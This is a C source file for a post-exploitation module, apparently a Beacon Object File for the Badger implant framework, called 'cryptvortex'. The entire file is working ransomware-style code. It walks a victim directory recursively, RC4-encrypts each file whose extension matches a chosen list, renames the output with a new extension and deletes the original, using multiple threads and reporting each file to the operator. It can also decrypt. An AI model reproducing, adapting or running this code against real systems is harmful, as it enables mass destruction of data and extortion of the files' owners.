#include <windows.h>
#include <stdio.h>
#include "badger_exports.h"

typedef struct _CRYPT_FILE_META {
    CHAR *fileName;
    CHAR *cryptionkey;
    CHAR *extension;
    WCHAR **dispatch;
    BOOL dwThreadRelease;
    BOOL actionType;
} CRYPT_FILE_META, *PCRYPT_FILE_META;

typedef struct _PVOID_STRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} PVOID_STRING, *PPVOID_STRING;

WINADVAPI BOOL WINAPI Kernel32$CloseHandle(HANDLE);
WINADVAPI HANDLE WINAPI Kernel32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINADVAPI HANDLE WINAPI Kernel32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,__drv_aliasesMem LPVOID, DWORD, LPDWORD);
WINADVAPI BOOL WINAPI Kernel32$DeleteFileA(LPCSTR);
WINADVAPI BOOL WINAPI Kernel32$FindClose(HANDLE);
WINADVAPI HANDLE WINAPI Kernel32$FindFirstFileA(LPCSTR, LPWIN32_FIND_DATAA);
WINADVAPI BOOL WINAPI Kernel32$FindNextFileA(HANDLE, LPWIN32_FIND_DATAA);
WINADVAPI BOOL WINAPI Kernel32$GetFileSizeEx(HANDLE, PLARGE_INTEGER);
WINADVAPI BOOL WINAPI Kernel32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINADVAPI DWORD WINAPI Kernel32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
WINADVAPI DWORD WINAPI Kernel32$WaitForMultipleObjects(DWORD, const HANDLE*, BOOL, DWORD);
WINADVAPI BOOL WINAPI Kernel32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);

WINADVAPI NTSTATUS WINAPI Advapi32$SystemFunction032(PPVOID_STRING source, PPVOID_STRING key);

WINADVAPI char* Msvcrt$strtok(char * __restrict__ _Str,const char * __restrict__ _Delim);
WINADVAPI char* Msvcrt$strcpy(char * __restrict__ __dst, const char * __restrict__ __src);
WINADVAPI char *Msvcrt$strstr(char* __s1, const char* __s2);
WINADVAPI int Msvcrt$sprintf_s(char *_DstBuf, size_t _DstSize, const char *_Format, ...);
WINADVAPI errno_t Msvcrt$strcat_s(char *_Dst, rsize_t _SizeInBytes, const char * _Src);

#define MAX_EXTENSIONS 100

INT Crypter(CHAR* cmdArgs, CHAR* extension, CHAR* cryptionkey, BOOL actionType, CHAR *extension_list[MAX_EXTENSIONS], INT extensions_count, WCHAR **dispatch);
PVOID RC4Encrypt(UCHAR* input, DWORD inputlength, UCHAR* key, DWORD keylen);
DWORD WINAPI EnDnThread(PCRYPT_FILE_META pCryptFileMeta);

PVOID RC4Encrypt(UCHAR* input, DWORD inputlength, UCHAR* key, DWORD keylen) {
    PVOID_STRING Rc4Key;
    Rc4Key.Buffer = key;
    Rc4Key.Length = Rc4Key.MaximumLength = keylen;
    PVOID_STRING encryptedBufferString;
    encryptedBufferString.Buffer = BadgerAlloc(inputlength+1);
    BadgerMemcpy(encryptedBufferString.Buffer, input, inputlength);
    encryptedBufferString.Length = encryptedBufferString.MaximumLength = inputlength;
    Advapi32$SystemFunction032(&encryptedBufferString, &Rc4Key);
    return encryptedBufferString.Buffer;
}

DWORD WINAPI EnDnThread(PCRYPT_FILE_META pCryptFileMeta) {
    UCHAR *encryptedfileBuffer = NULL;
    HANDLE hFile = NULL;
    HANDLE hencryptedFile = NULL;
    DWORD dwBytesRead = 0;
    DWORD dwBytesWritten = 0;
    DWORD dwfilesize = 0;
    LARGE_INTEGER filesize;
    CHAR *fileBuffer = NULL;

    WCHAR **dispatch = pCryptFileMeta->dispatch;
    BOOL doEncrypt = pCryptFileMeta->actionType;
    CHAR *fileName = BadgerAlloc(BadgerStrlen(pCryptFileMeta->fileName)+1);
    CHAR *cryptionkey = BadgerAlloc(BadgerStrlen(pCryptFileMeta->cryptionkey)+1);
    CHAR *extension = BadgerAlloc(BadgerStrlen(pCryptFileMeta->extension)+1);
    BadgerMemcpy(fileName, pCryptFileMeta->fileName, BadgerStrlen(pCryptFileMeta->fileName));
    BadgerMemcpy(cryptionkey, pCryptFileMeta->cryptionkey, BadgerStrlen(pCryptFileMeta->cryptionkey));
    BadgerMemcpy(extension, pCryptFileMeta->extension, BadgerStrlen(pCryptFileMeta->extension));

    CHAR *newFileName = BadgerAlloc(BadgerStrlen(pCryptFileMeta->fileName)+ BadgerStrlen(pCryptFileMeta->cryptionkey) + 1);
    if (doEncrypt) {
        BadgerMemcpy(newFileName, pCryptFileMeta->fileName, BadgerStrlen(pCryptFileMeta->fileName));
        BadgerMemcpy(newFileName+BadgerStrlen(newFileName), pCryptFileMeta->extension, BadgerStrlen(pCryptFileMeta->extension));
    } else {
        BadgerMemcpy(newFileName, pCryptFileMeta->fileName, BadgerStrlen(pCryptFileMeta->fileName));
        char* splitter = Msvcrt$strstr(newFileName, extension);
        splitter[0] = 0;
    }

    pCryptFileMeta->dwThreadRelease = TRUE;
    hFile = Kernel32$CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        goto cleanUp;
    }
    if (!(Kernel32$GetFileSizeEx(hFile, &filesize))) {
        goto cleanUp;
    }
    dwfilesize = (DWORD)filesize.QuadPart;
    fileBuffer = (CHAR*)BadgerAlloc(dwfilesize);
    if (! fileBuffer) {
        goto cleanUp;
    }
    Kernel32$ReadFile(hFile, fileBuffer, dwfilesize, &dwBytesRead, 0);
    Kernel32$CloseHandle(hFile);
    hFile = NULL;
    encryptedfileBuffer = RC4Encrypt(fileBuffer, dwfilesize, cryptionkey, BadgerStrlen(cryptionkey));
    hencryptedFile = Kernel32$CreateFileA(newFileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hencryptedFile == INVALID_HANDLE_VALUE) {
        goto cleanUp;
    }
    Kernel32$WriteFile(hencryptedFile, encryptedfileBuffer, dwfilesize, &dwBytesWritten, NULL);
    Kernel32$CloseHandle(hencryptedFile);
    Kernel32$DeleteFileA(fileName);
    if (doEncrypt) {
        BadgerDispatch(dispatch, "[E] %s\n", fileName);
    } else {
        BadgerDispatch(dispatch, "[D] %s\n", fileName);
    }
cleanUp:
    if (hFile) {
        Kernel32$CloseHandle(hFile);
    }

    BadgerFree((PVOID*)&newFileName);
    BadgerFree((PVOID*)&encryptedfileBuffer);
    BadgerFree((PVOID*)&fileBuffer);
    BadgerFree((PVOID*)&fileName);
    BadgerFree((PVOID*)&cryptionkey);
    BadgerFree((PVOID*)&extension);
    return 1;
}

INT Crypter(CHAR* cmdArgs, CHAR* extension, CHAR* cryptionkey, BOOL actionType, CHAR *extension_list[MAX_EXTENSIONS], INT extensions_count, WCHAR **dispatch) {
    INT threadCount = 0;
    INT MAXTHREAD_COUNT = 9;
    HANDLE threadArray[MAX_EXTENSIONS];
    INT cryptedFiles = 0;
    CHAR originFilePath[MAX_PATH] = { 0 };
    WIN32_FIND_DATA Filelist;
    HANDLE hFind;

    Msvcrt$strcat_s(originFilePath, MAX_PATH, cmdArgs);
    if (cmdArgs[BadgerStrlen(cmdArgs)-1] == '*') {
        hFind = Kernel32$FindFirstFileA(originFilePath, &Filelist);
        originFilePath[BadgerStrlen(originFilePath)-1] = 0;
    } else {
        CHAR hFindPath[MAX_PATH] = { 0 };
        Msvcrt$sprintf_s(hFindPath, MAX_PATH, "%s*", cmdArgs);
        hFind = Kernel32$FindFirstFileA(hFindPath, &Filelist);
    }

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (Filelist.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (BadgerStrcmp(Filelist.cFileName, ".") == 0) {
                    continue;
                }
                if (BadgerStrcmp(Filelist.cFileName, "..") == 0) {
                    continue;
                }
                CHAR createFilePath[1024] = { 0 };
                Msvcrt$sprintf_s(createFilePath, 1024, "%s%s\\", originFilePath, Filelist.cFileName);
                cryptedFiles += Crypter(createFilePath, extension, cryptionkey, actionType, extension_list, extensions_count, dispatch);
            } else {
                BOOL foundextension = FALSE;
                for (int i = 0; i < extensions_count; i++) {
                    if (Msvcrt$strstr(Filelist.cFileName, extension_list[i]) != NULL ) {
                        foundextension = TRUE;
                        break;
                    }
                }
                if (foundextension) {
                    CHAR createFilePath[1024] = { 0 };
                    Msvcrt$sprintf_s(createFilePath, 1024, "%s%s", originFilePath, Filelist.cFileName);
                    CRYPT_FILE_META CryptFileMeta = {
                        createFilePath,
                        cryptionkey,
                        extension,
                        dispatch,
                        FALSE,
                        actionType,
                    };
                    threadArray[threadCount] = Kernel32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EnDnThread, &CryptFileMeta, 0, 0);
                    if (threadArray[threadCount] != NULL && threadArray[threadCount] != INVALID_HANDLE_VALUE) {
                        while (CryptFileMeta.dwThreadRelease == FALSE) {
                            Kernel32$WaitForSingleObject((HANDLE)-1, 100);
                        }
                        threadCount++;
                        if(threadCount == MAXTHREAD_COUNT) {
                            Kernel32$WaitForMultipleObjects(MAXTHREAD_COUNT, threadArray, TRUE, INFINITE);
                            for (int i = 0; i < MAXTHREAD_COUNT; i++) {
                                Kernel32$CloseHandle(threadArray[i]);
                            }
                            threadCount = 0;
                        }
                    }
                    cryptedFiles++;
                }
            }
        } while (Kernel32$FindNextFileA(hFind, &Filelist));
        Kernel32$FindClose(hFind);
    }
    if (threadCount != 0) {
        Kernel32$WaitForMultipleObjects(threadCount, threadArray, TRUE, INFINITE);
        for (int i = 0; i < threadCount; i++) {
            Kernel32$CloseHandle(threadArray[i]);
        }
    }
    return cryptedFiles;
}

void coffee(char** argv, int argc, WCHAR** dispatch) {
    if (argc < 4) {
        BadgerDispatch(dispatch, "Usage: coffexec </path/cryptvortex.o> <encrypt/decrypt> <password> <directory in double quotes> <encrypted extension>\n");
        BadgerDispatch(dispatch, "Example: coffexec /root/cryptvortex.o encrypt secret@123 \"C:\\Users\\vendetta\\Desktop\\encrypt_me\\\" .enc \".txt,.ps1\"\n");
        return;
    }
    if ((argc == 4) && (BadgerStrcmp(argv[0], "decrypt") != 0)) {
        BadgerDispatch(dispatch, "Usage: coffexec </path/cryptvortex.o> <encrypt/decrypt> <password> <directory in double quotes> <encrypted extension>\n");
        BadgerDispatch(dispatch, "Example: coffexec /root/cryptvortex.o encrypt secret@123 \"C:\\Users\\vendetta\\Desktop\\encrypt_me\\\" .enc \".txt,.ps1\"\n");
        return;
    }
    if ((argc == 5) && (BadgerStrcmp(argv[0], "encrypt") != 0)) {
        BadgerDispatch(dispatch, "Usage: coffexec </path/cryptvortex.o> <encrypt/decrypt> <password> <directory in double quotes> <encrypted extension> <extensions to encrypt>\n");
        BadgerDispatch(dispatch, "Example: coffexec /root/cryptvortex.o encrypt secret@123 \"C:\\Users\\vendetta\\Desktop\\encrypt_me\\\" .enc \".txt,.ps1\"\n");
        return;
    }
    INT extensionsCount = 0;
    CHAR *extensionsList[MAX_EXTENSIONS];
    BadgerMemset(extensionsList, 0, sizeof(extensionsList));

    BOOL doEncrypt = TRUE;
    CHAR *actionType = argv[0];
    CHAR *encryptionkey = argv[1];
    CHAR *encryptPath = argv[2];
    CHAR *extension = argv[3];

    if (BadgerStrcmp(actionType, "encrypt") == 0) {
        CHAR *token = NULL;
        token = Msvcrt$strtok(argv[4], ",");
        while (token != NULL && extensionsCount < MAX_EXTENSIONS) {
            // Allocate memory for each token and copy it to the array
            extensionsList[extensionsCount] = BadgerAlloc(BadgerStrlen(token) + 1);
            Msvcrt$strcpy(extensionsList[extensionsCount], token);
            extensionsCount++;
            token = Msvcrt$strtok(NULL, ",");
        }

        BadgerDispatch(dispatch, "[+] Encryption directory: %s\n", encryptPath);
        BadgerDispatch(dispatch, "  - Encryption key: %s\n", encryptionkey);
        BadgerDispatch(dispatch, "  - Encrypted file extension: %s\n", extension);
        BadgerDispatch(dispatch, "  - Extensions to encrypt: %d\n", extensionsCount);
        for (int i = 0; i < extensionsCount; i++) {
            BadgerDispatch(dispatch, "    - %s\n", extensionsList[i]);
        }
    } else {
        extensionsList[extensionsCount] = BadgerAlloc(BadgerStrlen(extension) + 1);
        BadgerMemcpy(extensionsList[extensionsCount], extension, BadgerStrlen(extension));
        extensionsCount++;
        BadgerDispatch(dispatch, "[+] Decryption directory: %s\n", encryptPath);
        BadgerDispatch(dispatch, "  - Decryption key: %s\n", encryptionkey);
        BadgerDispatch(dispatch, "  - Decrypted file extension: %s\n", extension);
        doEncrypt = FALSE;
    }

    INT cryptedFileCount = Crypter(encryptPath, extension, encryptionkey, doEncrypt, extensionsList, extensionsCount, dispatch);
    if (doEncrypt) {
        BadgerDispatch(dispatch, "[+++] Encrypted %d file(s) [+++]\n", cryptedFileCount);
    } else {
        BadgerDispatch(dispatch, "[+++] Decrypted %d file(s) [+++]\n", cryptedFileCount);
    }
    for (int i = 0; i < extensionsCount; i++) {
        BadgerFree((PVOID*)&extensionsList[i]);
    }
}
